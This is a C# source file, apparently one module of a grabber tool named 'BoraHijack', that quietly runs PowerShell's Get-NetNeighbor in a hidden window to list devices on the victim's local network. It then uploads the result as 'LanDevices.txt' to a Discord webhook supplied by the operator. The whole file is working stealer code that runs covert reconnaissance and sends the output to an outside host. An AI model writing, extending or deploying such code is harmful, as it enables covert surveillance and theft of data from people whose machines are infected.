using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Discord;
using Discord.Webhook;
using System.Diagnostics;

namespace BoraHijack.Grabbers
{
    class LanDevices
    {
        public async static Task GetLanDevices(string webhookUrl)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "Get-NetNeighbor | Out-String",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            string output;
            using (var process = Process.Start(psi))
            {
                if (process == null) return;
                output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            }

            // Step 2: Convert to memory stream
            var bytes = Encoding.UTF8.GetBytes(output);
            var stream = new MemoryStream(bytes);

            // Step 3: Send with Discord.Net.Webhook
            var client = new DiscordWebhookClient(webhookUrl);

            await client.SendFileAsync(
                stream,
                "LanDevices.txt",
                text: "Lan Devices Discovered",
                isTTS: false,
                embeds: null,
                username: "BoraHijack",
                avatarUrl: "https://files.catbox.moe/zteeqk.png"
            );
        }
    }
}
